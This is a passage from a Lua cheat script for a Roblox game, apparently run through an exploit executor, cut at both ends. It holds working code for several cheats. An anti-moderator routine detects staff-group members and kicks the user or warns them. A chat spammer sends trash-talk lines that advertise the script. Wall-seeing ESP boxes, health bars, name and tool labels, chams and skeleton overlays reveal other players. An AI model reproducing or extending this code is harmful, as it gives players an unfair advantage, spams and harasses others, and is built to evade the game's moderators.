        _G.PlayEmote(_G.Sel, _G.Spd > 0 and _G.Spd or 1)
    end
end)
_G.antimodd = Player:section({name = "anti mod", side = "left"})
getgenv().antistaff = {Enabled = false, Kick = true, Notify = false, GroupId = 8068202}
_G.antimodd:toggle({
    name = "enabled",
    flag = "antimod_enabled",
    default = false,
    callback = function(v)
        getgenv().antistaff.Enabled = v
    end
})

_G.antimodd:dropdown({
    name = "to do",
    flag = "antimod_action",
    items = {"kick", "notify"},
    callback = function(v)
        if v == "kick" then
            getgenv().antistaff.Kick = true
            getgenv().antistaff.Notify = false
        else
            getgenv().antistaff.Kick = false
            getgenv().antistaff.Notify = true
        end
    end
})

game:GetService("Players").PlayerAdded:Connect(function(p)
    if getgenv().antistaff.Enabled and p:IsInGroup(getgenv().antistaff.GroupId) then
        if getgenv().antistaff.Notify then
            library:notification({text = "Moderator detected: " .. p.Name, duration = 8})
        end
        if getgenv().antistaff.Kick then
            task.wait(3)
            game:GetService("Players").LocalPlayer:Kick("Moderator detected: " .. p.Name)
        end
    end
end)

for i, p in ipairs(game:GetService("Players"):GetPlayers()) do
    if p ~= game:GetService("Players").LocalPlayer and getgenv().antistaff.Enabled and p:IsInGroup(getgenv().antistaff.GroupId) then
        if getgenv().antistaff.Notify then
            library:notification({text = "Moderator in-game: " .. p.Name, duration = 8})
        end
        if getgenv().antistaff.Kick then
            task.wait(3)
            game:GetService("Players").LocalPlayer:Kick("Moderator already in-game: " .. p.Name)
        end
        break
    end
end
local section1111 = Player:section({
    name = "chat sender",
    side = "right"
})
_G.ChatSpam_Enabled = false
_G.ChatSpam_TrashTalk_Enabled = false
_G.ChatSpam_Custom_Enabled = false
_G.ChatSpam_CustomText = 'ur noob, haha, too easy'
_G.ChatSpam_Delay = 3
_G.ChatSpam_LastTime = 0
_G.ChatSpam_Index = 1
_G.ChatSpam_History = {}
_G.TrashTalkList = {
    "imagine getting cracked by sample 💀", "getsample.lol", "get better buddy", "skill issue", 
    "get sample.hit today", "stop 😂", "free script btw", "mad?", "cry about it", "trash", 
    "noob lol", "owned by sample", "get rekt", "you're bad", "stay mad with no sample", 
    "no sample = no skill", "washed", "dogwater", "200 pumped by sample"
}

section1111:toggle({
    name = "master toggle",
    flag = "chat_master",
    default = false,
    callback = function(val)
        _G.ChatSpam_Enabled = val
    end
})

section1111:toggle({
    name = "trash talk",
    flag = "chat_trash",
    default = false,
    callback = function(val)
        _G.ChatSpam_TrashTalk_Enabled = val
        if val then
            _G.ChatSpam_Custom_Enabled = false
            if flags then flags["chat_custom"] = false end
        end
    end
})

section1111:toggle({
    name = "custom chats",
    flag = "chat_custom",
    default = false,
    callback = function(val)
        _G.ChatSpam_Custom_Enabled = val
        if val then
            _G.ChatSpam_TrashTalk_Enabled = false
            if flags then flags["chat_trash"] = false end
        end
    end
})

section1111:textbox({
    name = "custom messages",
    flag = "chat_custom_text",
    callback = function(val)
        _G.ChatSpam_CustomText = val
    end
})

section1111:slider({
    name = "global delay",
    suffix = "s",
    flag = "chat_delay",
    default = 3,
    min = 1.5,
    max = 20,
    interval = 0.5,
    callback = function(val)
        _G.ChatSpam_Delay = val
    end
})
task.spawn(function()
    while task.wait(0.1) do
        if _G.ChatSpam_Enabled then
            if _G.ChatSpam_TrashTalk_Enabled or _G.ChatSpam_Custom_Enabled then
                local currentTime = tick()
                if currentTime - _G.ChatSpam_LastTime >= _G.ChatSpam_Delay then
                    local message = ""
                    if _G.ChatSpam_TrashTalk_Enabled then
                        message = _G.TrashTalkList[_G.ChatSpam_Index]
                        _G.ChatSpam_Index = (_G.ChatSpam_Index % #_G.TrashTalkList) + 1
                    elseif _G.ChatSpam_Custom_Enabled then
                        local phrases = {}
                        for s in _G.ChatSpam_CustomText:gmatch("([^,]+)") do
                            table.insert(phrases, s:match("^%s*(.-)%s*$"))
                        end
                        if #phrases > 0 then
                            local chosen = ""
                            local attempts = 0
                            repeat
                                chosen = phrases[math.random(1, #phrases)]
                                attempts = attempts + 1
                                local is_repeat = false
                                for _, prev in ipairs(_G.ChatSpam_History) do
                                    if prev == chosen then is_repeat = true break end
                                end
                            until not is_repeat or attempts > 10 
                            message = chosen
                        else
                            message = _G.ChatSpam_CustomText
                        end
                    end
                    if message ~= "" then
                        table.insert(_G.ChatSpam_History, message)
                        if #_G.ChatSpam_History > 4 then
                            table.remove(_G.ChatSpam_History, 1)
                        end
                        pcall(function()
                            local tcs = game:GetService("TextChatService")
                            if tcs.ChatVersion == Enum.ChatVersion.TextChatService then
                                local channel = tcs.TextChannels:FindFirstChild("RBXGeneral") or tcs.TextChannels:FindFirstChildOfClass("TextChannel")
                                if channel then channel:SendAsync(message) end
                            else
                                local chatEvents = game:GetService("ReplicatedStorage"):FindFirstChild("DefaultChatSystemChatEvents")
                                if chatEvents then
                                    chatEvents.SayMessageRequest:FireServer(message, "All")
                                end
                            end
                        end)
                        _G.ChatSpam_LastTime = currentTime
                    end
                end
            end
        end
    end
end)
if not _G.Config then _G.Config = {} end
if not _G.Config.Box then
    _G.Config.Box = {
        MasterEnabled = false,
        Enable = false,
        SelfESP = false,
        Rotatingg = false,
        AnimType = "forward and backward",
        AnimSpeed = 1.5,
        OutlineColor = Color3RGB(255, 255, 255),
        FillColor = Color3RGB(255,255,255),
        Filled = { 
            Enable = false, 
            Transparency = 0.5,
            Color1 = Color3RGB(255, 255, 255),
            Color2 = Color3RGB(0, 0, 0)
        },
        Glow = { Enable = false, Intensity = 0.12, Color = Color3RGB(0, 225, 255) },
        Healthbar = { Enable = false, Thickness = 1 },
        HealthLerp = { Enable = false },
        HealthLerpColors = {
            Color1 = Color3RGB(255,0,0),
            Color2 = Color3RGB(255,255,0),
            Color3 = Color3RGB(0,255,0)
        },
        GradientOutline = {
            Color1 = Color3RGB(255, 255, 255),
            Color2 = Color3RGB(255, 255, 255),
            Color3 = Color3RGB(255, 255, 255),
            Color4 = Color3RGB(255, 255, 255),
            Color5 = Color3RGB(255, 255, 255),
            Color6 = Color3RGB(255, 255, 255)
        }
    }
end

if not _G.healthoffseth then _G.healthoffseth = 2 end
if not _G.ESPObjects then _G.ESPObjects = {} end
if not _G.Config.TextESP then _G.Config.TextESP = { Names = false, Tools = false, NameSize = 11.0, ToolSize = 11.0, NameOffset = 16 } end
local ConfigBox = _G.Config.Box
local ESPObjects = _G.ESPObjects
local TextESP = _G.Config.TextESP
local esponscreen = LPH_NO_VIRTUALIZE(function(part)
    if not part then return false end
    local _, onScreen = Camera:WorldToViewportPoint(part.Position)
    return onScreen
end)
local LerpColor = LPH_NO_VIRTUALIZE(function(minColor, midColor, maxColor, value)
    if value < 0.5 then
        return minColor:lerp(midColor, value * 2)
    else
        return midColor:lerp(maxColor, (value - 0.5) * 2)
    end
end)

local CreateBox = LPH_NO_VIRTUALIZE(function(player)
    if ESPObjects[player] then return end
    local box = {}
    
    local segmentCount = 40
    box.OutlineSegments = {} 
    for i = 1, segmentCount do
        local segs = {}
        for j = 1, 4 do
            local s = DrawingNew("Square")
            s.Visible = false
            s.Filled = true
            segs[j] = s
        end
        box.OutlineSegments[i] = segs
    end

    box.OuterOutline = DrawingNew("Square")
    box.OuterOutline.Visible = false
    box.OuterOutline.Thickness = 0.8
    box.OuterOutline.Color = Color3RGB(0,0,0)
    box.InnerOutline = DrawingNew("Square")
    box.InnerOutline.Visible = false
    box.InnerOutline.Thickness = 0.5
    box.InnerOutline.Color = Color3RGB(0,0,0)
    box.Health = DrawingNew("Square")
    box.Health.Visible = false
    box.Health.Filled = true
    box.HealthOutline = DrawingNew("Square")
    box.HealthOutline.Visible = false
    box.HealthOutline.Thickness = 0.5
    box.HealthOutline.Color = Color3RGB(0,0,0)
    box.HealthSegments = {}
    for i = 1, 29 do
        local seg = DrawingNew("Square")
        seg.Visible = false
        seg.Filled = true
        box.HealthSegments[i] = seg
    end
    box.GradientSegments = {}
    for i = 1, 130 do
        local seg = DrawingNew("Square")
        seg.Visible = false
        seg.Filled = true
        box.GradientSegments[i] = seg
    end
    box.GlowLayers = {}
    for i = 1, 15 do
        local l = DrawingNew("Square")
        l.Visible = false
        l.Filled = false
        l.Thickness = i * 2
        l.Color = ConfigBox.Glow.Color
        box.GlowLayers[i] = l
    end
    box.NameText = DrawingNew("Text")
    box.NameText.Visible = false
    box.NameText.Center = true
    box.NameText.Outline = true
    box.NameText.Color = Color3RGB(255, 255, 255)
    box.NameText.Font = 2
    box.ToolText = DrawingNew("Text")
    box.ToolText.Visible = false
    box.ToolText.Center = true
    box.ToolText.Outline = true
    box.ToolText.Color = Color3RGB(255, 255, 255)
    box.ToolText.Font = 2
    ESPObjects[player] = box
end)
local RemoveBox = LPH_NO_VIRTUALIZE(function(player)
    local box = ESPObjects[player]
    if not box then return end
    box.OuterOutline:Remove()
    box.InnerOutline:Remove()
    box.Health:Remove()
    box.HealthOutline:Remove()
    box.NameText:Remove()
    box.ToolText:Remove()
    for _, segs in ipairs(box.OutlineSegments) do 
        segs[1]:Remove() segs[2]:Remove() segs[3]:Remove() segs[4]:Remove()
    end
    for _, seg in ipairs(box.HealthSegments) do seg:Remove() end
    for _, seg in ipairs(box.GradientSegments) do seg:Remove() end
    for _, l in ipairs(box.GlowLayers) do l:Remove() end
    ESPObjects[player] = nil
end)
local espknock = LPH_NO_VIRTUALIZE(function(player)
    local char = player.Character
    if not char then return false end
    local bodyEffects = char:FindFirstChild("BodyEffects")
    if bodyEffects then
       -- local ko = bodyEffects:FindFirstChild("K.O") or bodyEffects:FindFirstChild("KO")
       -- return ko and ko.Value
    end
    return false
end)

local updatesp = LPH_NO_VIRTUALIZE(function()
    local tickTime = tick() * (ConfigBox.AnimSpeed or 1.5)
    local masterEnabled = ConfigBox.MasterEnabled
    local enable = ConfigBox.Enable
    local selfESP = ConfigBox.SelfESP
    local rotating = ConfigBox.Rotatingg
    local animType = ConfigBox.AnimType
    local fillCfg = ConfigBox.Filled
    local glowCfg = ConfigBox.Glow
    local healthbarEnable = ConfigBox.Healthbar.Enable
    local healthbarThickness = ConfigBox.Healthbar.Thickness
    local healthLerpColors = ConfigBox.HealthLerpColors
    local gradientOutline = ConfigBox.GradientOutline
    local players = Players:GetPlayers()
    local boxSize = Vector3New(4, 5.5, 2)
    local halfBoxSize = boxSize / 2
    local camera = workspace.CurrentCamera

    for i = 1, #players do
        local player = players[i]
        if player == LocalPlayer and not selfESP then 
            RemoveBox(player) 
            continue 
        end

        local char = player.Character
        local hum = char and char:FindFirstChild("Humanoid")
        local root = char and char:FindFirstChild("HumanoidRootPart")

        if not hum or not root then 
            RemoveBox(player) 
            continue 
        end

        if player ~= LocalPlayer and espknock(player) then 
            RemoveBox(player) 
            continue 
        end

        local box = ESPObjects[player]
        if not box then 
            CreateBox(player) 
            box = ESPObjects[player] 
        end

        local _, onScreen = camera:WorldToViewportPoint(root.Position)
        if not (masterEnabled and (player == LocalPlayer or onScreen)) then
            box.OuterOutline.Visible = false
            box.InnerOutline.Visible = false
            box.Health.Visible = false
            box.HealthOutline.Visible = false
            box.NameText.Visible = false
            box.ToolText.Visible = false
            local outlineSegments = box.OutlineSegments
            for j = 1, #outlineSegments do
                local s = outlineSegments[j]
                s[1].Visible = false; s[2].Visible = false; s[3].Visible = false; s[4].Visible = false
            end
            local healthSegments = box.HealthSegments
            for j = 1, #healthSegments do healthSegments[j].Visible = false end
            local gradientSegments = box.GradientSegments
            for j = 1, #gradientSegments do gradientSegments[j].Visible = false end
            local glowLayers = box.GlowLayers
            for j = 1, #glowLayers do glowLayers[j].Visible = false end
            continue
        end

        local cf = root.CFrame
        local minX, minY, maxX, maxY = math_huge, math_huge, -math_huge, -math_huge
        local anyOnScreen = false

        local corners = {
            cf * CFrameNew(-halfBoxSize.X,  halfBoxSize.Y,  halfBoxSize.Z),
            cf * CFrameNew( halfBoxSize.X,  halfBoxSize.Y,  halfBoxSize.Z),
            cf * CFrameNew(-halfBoxSize.X, -halfBoxSize.Y,  halfBoxSize.Z),
            cf * CFrameNew( halfBoxSize.X, -halfBoxSize.Y,  halfBoxSize.Z),
            cf * CFrameNew(-halfBoxSize.X,  halfBoxSize.Y, -halfBoxSize.Z),
            cf * CFrameNew( halfBoxSize.X,  halfBoxSize.Y, -halfBoxSize.Z),
            cf * CFrameNew(-halfBoxSize.X, -halfBoxSize.Y, -halfBoxSize.Z),
            cf * CFrameNew( halfBoxSize.X, -halfBoxSize.Y, -halfBoxSize.Z)
        }

        for j = 1, 8 do
            local screenPos, isOnScreen = camera:WorldToViewportPoint(corners[j].Position)
            if isOnScreen then
                anyOnScreen = true
                local x, y = screenPos.X, screenPos.Y
                if x < minX then minX = x end
                if y < minY then minY = y end
                if x > maxX then maxX = x end
                if y > maxY then maxY = y end
            end
        end

        if not anyOnScreen then
            local gradientSegments = box.GradientSegments
            for j = 1, #gradientSegments do gradientSegments[j].Visible = false end
            local glowLayers = box.GlowLayers
            for j = 1, #glowLayers do glowLayers[j].Visible = false end
            continue
        end

        local sizeX, sizeY = maxX - minX, maxY - minY
        
        local glowEnabled = glowCfg.Enable and enable
        local glowLayers = box.GlowLayers
        for j = 1, #glowLayers do
            local l = glowLayers[j]
            if glowEnabled then
                local spread = j * 3
                l.Visible = true
                l.Size = Vector2New(sizeX + spread, sizeY + spread)
                l.Position = Vector2New(minX - (spread/2), minY - (spread/2))
                l.Transparency = math_clamp(glowCfg.Intensity / (j * 0.8), 0, 1)
                l.Color = glowCfg.Color
            else
                l.Visible = false
            end
        end

        local outlineSegments = box.OutlineSegments
        local segmentCount = #outlineSegments
        local sizeYDiv = sizeY / segmentCount
        local sizeXDiv = sizeX / segmentCount

        for i = 1, segmentCount do
            local segs = outlineSegments[i]
            local baseT = (i - 1) / (segmentCount - 1)
            local t = baseT
            if rotating then
                if animType == "circling box to left" then t = (baseT + tickTime) % 1
                elseif animType == "circling box to right" then t = (baseT - tickTime) % 1
                elseif animType == "forward and backward" then t = (math_sin(tickTime + (baseT * math_pi * 2)) + 1) * 0.5 end
            end

            local color1 = t <= 0.5 and gradientOutline.Color1:lerp(gradientOutline.Color5, t*2) or gradientOutline.Color5:lerp(gradientOutline.Color3, (t-0.5)*2)
            local color2 = t <= 0.5 and gradientOutline.Color2:lerp(gradientOutline.Color6, t*2) or gradientOutline.Color6:lerp(gradientOutline.Color4, (t-0.5)*2)
            local color3 = t <= 0.5 and gradientOutline.Color1:lerp(gradientOutline.Color2, t*2) or gradientOutline.Color2:lerp(gradientOutline.Color1, (t-0.5)*2)
            local color4 = t <= 0.5 and gradientOutline.Color3:lerp(gradientOutline.Color4, t*2) or gradientOutline.Color4:lerp(gradientOutline.Color3, (t-0.5)*2)

            segs[1].Visible = enable
            segs[1].Size = Vector2New(1, sizeYDiv)
            segs[1].Position = Vector2New(minX, minY + (i-1)*sizeYDiv)
            segs[1].Color = color1

            segs[2].Visible = enable
            segs[2].Size = Vector2New(1, sizeYDiv)
            segs[2].Position = Vector2New(maxX - 1, minY + (i-1)*sizeYDiv)
            segs[2].Color = color2

            segs[3].Visible = enable
            segs[3].Size = Vector2New(sizeXDiv, 1)
            segs[3].Position = Vector2New(minX + (i-1)*sizeXDiv, minY)
            segs[3].Color = color3

            segs[4].Visible = enable
            segs[4].Size = Vector2New(sizeXDiv, 1)
            segs[4].Position = Vector2New(minX + (i-1)*sizeXDiv, maxY - 1)
            segs[4].Color = color4
        end

        local gSegs = box.GradientSegments
        local gSegCount = #gSegs
        if fillCfg.Enable and enable then
            local h = (sizeY - 4) / gSegCount
            for j = 1, gSegCount do
                local s = gSegs[j]
                s.Visible = true
                s.Size = Vector2New(sizeX - 4, h + 0.5)
                s.Position = Vector2New(minX + 2, minY + 2 + (j-1)*h)
                s.Transparency = fillCfg.Transparency
                s.Color = fillCfg.Color1:lerp(fillCfg.Color2, (j-1)/(gSegCount-1))
            end
        else
            for j = 1, gSegCount do gSegs[j].Visible = false end
        end

        box.OuterOutline.Visible = enable
        box.OuterOutline.Size = Vector2New(sizeX + 2, sizeY + 2)
        box.OuterOutline.Position = Vector2New(minX - 1, minY - 1)

        box.InnerOutline.Visible = enable
        box.InnerOutline.Size = Vector2New(sizeX - 2, sizeY - 2)
        box.InnerOutline.Position = Vector2New(minX + 1, minY + 1)

        if healthbarEnable then
            local hp = math_clamp(hum.Health / hum.MaxHealth, 0, 1)
            local bH = sizeY * hp
            local bX = minX - healthbarThickness - 3
            box.HealthOutline.Visible = true
            box.HealthOutline.Size = Vector2New(healthbarThickness + 2, sizeY + 2)
            box.HealthOutline.Position = Vector2New(bX - 1, minY - 1)
            
            local hSegs = box.HealthSegments
            local hSegCount = #hSegs
            local segH = bH / hSegCount
            for j = 1, hSegCount do
                local s = hSegs[j]
                s.Visible = true
                s.Size = Vector2New(healthbarThickness, segH + 0.5)
                s.Position = Vector2New(bX, minY + (sizeY - bH) + (j-1)*segH)
                s.Color = LerpColor(healthLerpColors.Color1, healthLerpColors.Color2, healthLerpColors.Color3, hp * (j/hSegCount))
            end
        else
            box.HealthOutline.Visible = false
            local hSegs = box.HealthSegments
            for j = 1, #hSegs do hSegs[j].Visible = false end
        end

        if TextESP.Names then
            box.NameText.Visible = true
            box.NameText.Text = player.DisplayName or player.Name
            box.NameText.Size = TextESP.NameSize
            box.NameText.Position = Vector2New(minX + sizeX * 0.5, minY - TextESP.NameOffset)
        else
            box.NameText.Visible = false
        end
        
        if TextESP.Tools then
            local tool = char:FindFirstChildOfClass("Tool")
            if tool then
                box.ToolText.Visible = true
                box.ToolText.Text = tool.Name
                box.ToolText.Size = TextESP.ToolSize
                box.ToolText.Position = Vector2New(minX + sizeX * 0.5, maxY + 5)
            else
                box.ToolText.Visible = false
            end
        else
            box.ToolText.Visible = false
        end
    end
end)
Players.PlayerRemoving:Connect(RemoveBox)
RunService.RenderStepped:Connect(updatesp)
local section = Visuals:section({name = "esp"})
section:toggle({
    name = "enabled",
    flag = "box_master",
    default = _G.Config.Box.MasterEnabled,
    callback = function(Value) _G.Config.Box.MasterEnabled = Value end
})

section:toggle({
    name = "self esp",
    flag = "selfesp",
    default = false,
    callback = function(Value) _G.Config.Box.SelfESP = Value end
})

section:toggle({
    name = "boxes",
    flag = "box_enabled2",
    default = _G.Config.Box.Enable,
    callback = function(Value) _G.Config.Box.Enable = Value end
})

for i = 1, 6 do
    section:colorpicker({
        flag = "box_grad_" .. i,
        color = _G.Config.Box.GradientOutline["Color" .. i],
        callback = function(Value)
            _G.Config.Box.GradientOutline["Color" .. i] = Value
        end
    })
end

section:toggle({
    name = "outline moving animation",
    flag = "box_anim_toggle",
    default = false,
    callback = function(Value) _G.Config.Box.Rotatingg = Value end
})

section:dropdown({
    name = "moving animation type",
    flag = "box_anim_type",
    items = {"circling box to left","circling box to right","forward and backward"},
    multi = false,
    callback = function(Value) _G.Config.Box.AnimType = Value end
})

section:slider({
    name = "moving animation speed",
    flag = "box_anim_speed",
    default = _G.Config.Box.AnimSpeed,
    min = 0,
    max = 10,
    interval = 0.05,
    callback = function(Value) _G.Config.Box.AnimSpeed = Value end
})

section:toggle({
    name = "filled",
    flag = "box_filled",
    default = _G.Config.Box.Filled.Enable,
    callback = function(Value) _G.Config.Box.Filled.Enable = Value end
})

section:colorpicker({
    flag = "box_fill_c1",
    color = _G.Config.Box.Filled.Color1,
    callback = function(Value) _G.Config.Box.Filled.Color1 = Value end
})

section:colorpicker({
    flag = "box_fill_c2",
    color = _G.Config.Box.Filled.Color2,
    callback = function(Value) _G.Config.Box.Filled.Color2 = Value end
})

section:slider({
    name = "fill transparency",
    flag = "box_fill_trans",
    default = _G.Config.Box.Filled.Transparency,
    min = 0,
    max = 1,
    interval = 0.05,
    callback = function(Value) _G.Config.Box.Filled.Transparency = Value end
})

section:toggle({
    name = "glow",
    flag = "box_glow_enabled",
    default = _G.Config.Box.Glow.Enable,
    callback = function(Value) _G.Config.Box.Glow.Enable = Value end
})

section:colorpicker({
    flag = "box_glow_color",
    color = _G.Config.Box.Glow.Color,
    callback = function(Value) _G.Config.Box.Glow.Color = Value end
})
section:slider({
    name = "glow intensity",
    flag = "box_glow_intense",
    default = _G.Config.Box.Glow.Intensity * 100,
    min = 0,
    max = 8,
    interval = 2,
    callback = function(Value) _G.Config.Box.Glow.Intensity = Value / 100 end
})

section:toggle({
    name = "healthbar",
    flag = "healthbar",
    default = _G.Config.Box.Healthbar.Enable,
    callback = function(Value)
        _G.Config.Box.Healthbar.Enable = Value
        _G.Config.Box.HealthLerp.Enable = Value
    end
})

for i = 1, 3 do
    section:colorpicker({
        flag = "hp_c" .. i,
        color = _G.Config.Box.HealthLerpColors["Color" .. i],
        callback = function(Value) _G.Config.Box.HealthLerpColors["Color" .. i] = Value end
    })
end

section:toggle({
    name = "names",
    flag = "esp_names",
    default = _G.Config.TextESP.Names,
    callback = function(Value) _G.Config.TextESP.Names = Value end
})

section:toggle({
    name = "tools",
    flag = "esp_tools",
    default = _G.Config.TextESP.Tools,
    callback = function(Value) _G.Config.TextESP.Tools = Value end
})

section:slider({
    name = "names size",
    flag = "esp_names_size",
    default = _G.Config.TextESP.NameSize,
    min = 8,
    max = 32,
    interval = 1,
    callback = function(Value) _G.Config.TextESP.NameSize = Value end
})

section:slider({
    name = "tools size",
    flag = "esp_tools_size",
    default = _G.Config.TextESP.ToolSize,
    min = 8,
    max = 32,
    interval = 1,
    callback = function(Value) _G.Config.TextESP.ToolSize = Value end
})
local chamclr = Color3.fromRGB(255, 136, 0)
_G.chams = _G.chams or false
local function CreateCham(player)
    local character = player.Character
    if not character or character:FindFirstChild("ChamHighlight") then return end
    if not character:FindFirstChild("HumanoidRootPart") then return end
    local highlight = Instance.new("Highlight")
    highlight.Name = "ChamHighlight"
    highlight.Parent = character
    highlight.Adornee = character
    highlight.FillColor = chamclr
    highlight.FillTransparency = 0.5
    highlight.OutlineTransparency = 1
    highlight.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
end
local function RemoveCham(player)
    local character = player.Character
    if character then
        local highlight = character:FindFirstChild("ChamHighlight")
        if highlight then
            highlight:Destroy()
        end
    end
end
section:toggle({
    name = "mesh chams",
    flag = "chams_enabled",
    default = false,
    callback = function(Value)
        _G.chams = Value
        local players = game.Players:GetPlayers()
        for i = 1, #players do
            local player = players[i]
            if not _G.chams then
                RemoveCham(player)
            else
                if player ~= game.Players.LocalPlayer or _G.Config.Box.SelfESP then
                    CreateCham(player)
                else
                    RemoveCham(player)
                end
            end
        end
    end
})
section:colorpicker({
    flag = "highlight_color",
    color = chamclr,
    callback = function(Value)
        chamclr = Value
        local players = game.Players:GetPlayers()
        for i = 1, #players do
            local highlight = players[i].Character and players[i].Character:FindFirstChild("ChamHighlight")
            if highlight then
                highlight.FillColor = chamclr
            end
        end
    end
})
game.Players.PlayerAdded:Connect(function(player)
    player.CharacterAdded:Connect(function(character)
        if _G.chams then
            if player ~= game.Players.LocalPlayer or _G.Config.Box.SelfESP then
                character:WaitForChild("HumanoidRootPart")
                CreateCham(player)
            end
        end
    end)
end)
game.Players.PlayerRemoving:Connect(function(player)
    RemoveCham(player)
end)
game:GetService("RunService").Heartbeat:Connect(LPH_NO_VIRTUALIZE(function()
    if _G.chams then
        local players = game.Players:GetPlayers()
        local lp = game.Players.LocalPlayer
        for i = 1, #players do
            local player = players[i]
            local isLocal = (player == lp)
            if isLocal and not _G.Config.Box.SelfESP then
                RemoveCham(player)
                continue
            end
            if (not isLocal or _G.Config.Box.SelfESP) and player.Character then
                if not player.Character:FindFirstChild("ChamHighlight") then
                    local root = player.Character:FindFirstChild("HumanoidRootPart")
                    if root then
                        local _, onscreen = game.Workspace.CurrentCamera:WorldToViewportPoint(root.Position)
                        if onscreen then
                            CreateCham(player)
                        end
                    end
                end
            end
        end
    else
        local players = game.Players:GetPlayers()
        for i = 1, #players do
            RemoveCham(players[i])
        end
    end
end))
_G.v992kk_enabled = false
_G.v992kk_color = Color3.fromRGB(255, 255, 255)
_G.v992kk_cache = _G.v992kk_cache or {}
_G.v992kk_folder = _G.v992kk_folder or nil
_G.v992kk_parts = {
    'Head', 'UpperTorso', 'LowerTorso', 'LeftUpperArm', 'LeftLowerArm', 'LeftHand',
    'RightUpperArm', 'RightLowerArm', 'RightHand', 'LeftUpperLeg', 'LeftLowerLeg',
    'LeftFoot', 'RightUpperLeg', 'RightLowerLeg', 'RightFoot'
}
_G.v992kk_init = function()
    if not _G.v992kk_folder then
        _G.v992kk_folder = Instance.new('Folder')
        _G.v992kk_folder.Name = "ch_rt"
        _G.v992kk_folder.Parent = game:GetService("Players").LocalPlayer:WaitForChild("PlayerGui")
    end
    return _G.v992kk_folder
end
_G.v992kk_clear = function(p)
    if _G.v992kk_cache[p] then
        for i = 1, #_G.v992kk_cache[p] do
            _G.v992kk_cache[p][i]:Destroy()
        end
        _G.v992kk_cache[p] = nil
    end
end
_G.v992kk_apply = LPH_NO_VIRTUALIZE(function(p)
    local char = p.Character
    if not char or not _G.v992kk_enabled then 
        _G.v992kk_clear(p)
        return 
    end
    if p == game.Players.LocalPlayer and not _G.Config.Box.SelfESP then
        _G.v992kk_clear(p)
        return
    end
    local hrp = char:FindFirstChild("HumanoidRootPart")
    if hrp then
        local _, onScreen = game.Workspace.CurrentCamera:WorldToViewportPoint(hrp.Position)
        if not onScreen then
            _G.v992kk_clear(p)
            return
        end
    end
    if _G.v992kk_cache[p] then
        local cache = _G.v992kk_cache[p]
        for i = 1, #cache do
            cache[i].Color3 = _G.v992kk_color
            cache[i].Visible = true
        end
        return
    end
    local f = _G.v992kk_init()
    local list = {}
    for i = 1, #_G.v992kk_parts do
        local name = _G.v992kk_parts[i]
        local part = char:FindFirstChild(name)
        if part and part:IsA("BasePart") then
            local box = Instance.new("BoxHandleAdornment")
            box.Size = (name == "Head") and Vector3.new(1.1, 1.1, 1.1) or part.Size
            box.Adornee = part
            box.AlwaysOnTop = true
            box.ZIndex = 5
            box.Transparency = 0.5
            box.Color3 = _G.v992kk_color
            box.Parent = f
            table.insert(list, box)
        end
    end
    _G.v992kk_cache[p] = list
end)
_G.v992kk_loop = LPH_NO_VIRTUALIZE(function()
    local players = game.Players:GetPlayers()
    for i = 1, #players do
        _G.v992kk_apply(players[i])
    end
end)
section:toggle({
    name = "blocky chams",
    flag = "chamsaa_enabled",
    default = false,
    callback = function(v)
        _G.v992kk_enabled = v
        if not v then
            for p, _ in pairs(_G.v992kk_cache) do
                _G.v992kk_clear(p)
            end
            if _G.v992kk_con then _G.v992kk_con:Disconnect() _G.v992kk_con = nil end
        else
            _G.v992kk_con = game:GetService("RunService").RenderStepped:Connect(function()
                _G.v992kk_loop()
            end)
        end
    end
})
section:colorpicker({
    flag = "highlightaaa_color",
    color = Color3.fromRGB(255, 255, 255),
    callback = function(v)
        _G.v992kk_color = v
    end
})
_G.skel_sett_882 = {enabled = false,skeletonsMainColor = Color3.fromRGB(255, 255, 255),skeletonsOutlineColor = Color3.fromRGB(0, 0, 0),skeletonsMainThickness = 1,skeletonsOutlineThickness = 2.5,skeletonsMainAlpha = 0,skeletonsOutlineAlpha = 0}
_G.skel_data_991 = {
    cache = {},
    bones = {
        {'Head', 'Neck'}, {'Neck', 'UpperTorso'}, {'UpperTorso', 'LowerTorso'},
        {'LowerTorso', 'LeftUpperLeg'}, {'LowerTorso', 'RightUpperLeg'},
        {'LeftUpperLeg', 'LeftLowerLeg'}, {'RightUpperLeg', 'RightLowerLeg'},
        {'LeftLowerLeg', 'LeftFoot'}, {'RightLowerLeg', 'RightFoot'},
        {'UpperTorso', 'LeftUpperArm'}, {'UpperTorso', 'RightUpperArm'},
        {'LeftUpperArm', 'LeftLowerArm'}, {'RightUpperArm', 'RightLowerArm'},
        {'LeftLowerArm', 'LeftHand'}, {'RightLowerArm', 'RightHand'}
    }
}
section:toggle({
    name = "skeletons",
    flag = "skel_enabled_toggle",
    default = false,
    callback = function(v)
        _G.skel_sett_882.enabled = v
    end
})
section:colorpicker({
    flag = "skel_color_picker",
    color = Color3.fromRGB(255, 255, 255),
    callback = function(v)
        _G.skel_sett_882.skeletonsMainColor = v
    end
})
_G.skel_rem_v5 = function(p)
    local data = _G.skel_data_991.cache[p]
    if data then
        for i = 1, #data.boneLines do
            if data.boneLines[i].outline then data.boneLines[i].outline:Remove() end
            if data.boneLines[i].main then data.boneLines[i].main:Remove() end
        end
        _G.skel_data_991.cache[p] = nil
    end
end
_G.skel_upd_v5 = LPH_NO_VIRTUALIZE(function()
    local cam = Workspace.CurrentCamera
    if not cam then return end
    for _, p in pairs(Players:GetPlayers()) do
        if p == LocalPlayer and not _G.Config.Box.SelfESP then 
            _G.skel_rem_v5(p)
            continue 
        end
        local char = p.Character
        local hum = char and char:FindFirstChildOfClass("Humanoid")
        local hrp = char and char:FindFirstChild("HumanoidRootPart")
        if not _G.skel_sett_882.enabled or not char or not hum or hum.Health <= 0 or not hrp then
            _G.skel_rem_v5(p)
            continue
        end
        if not _G.skel_data_991.cache[p] then
            local bl = {}
            for i = 1, #_G.skel_data_991.bones do
                bl[i] = {
                    outline = Drawing.new("Line"),
                    main = Drawing.new("Line")
                }
            end
            _G.skel_data_991.cache[p] = {boneLines = bl, player = p}
        end
        local data = _G.skel_data_991.cache[p]
        local _, onScreen = cam:WorldToViewportPoint(hrp.Position)
        for i, conn in ipairs(_G.skel_data_991.bones) do
            local p1 = char:FindFirstChild(conn[1])
            local p2 = char:FindFirstChild(conn[2])
            if onScreen and p1 and p2 and p1:IsA("BasePart") and p2:IsA("BasePart") then
                local s1, o1 = cam:WorldToViewportPoint(p1.Position)
                local s2, o2 = cam:WorldToViewportPoint(p2.Position)
                if o1 and o2 and s1.Z > 0 and s2.Z > 0 then
                    local from = Vector2.new(s1.X, s1.Y)
                    local to = Vector2.new(s2.X, s2.Y)
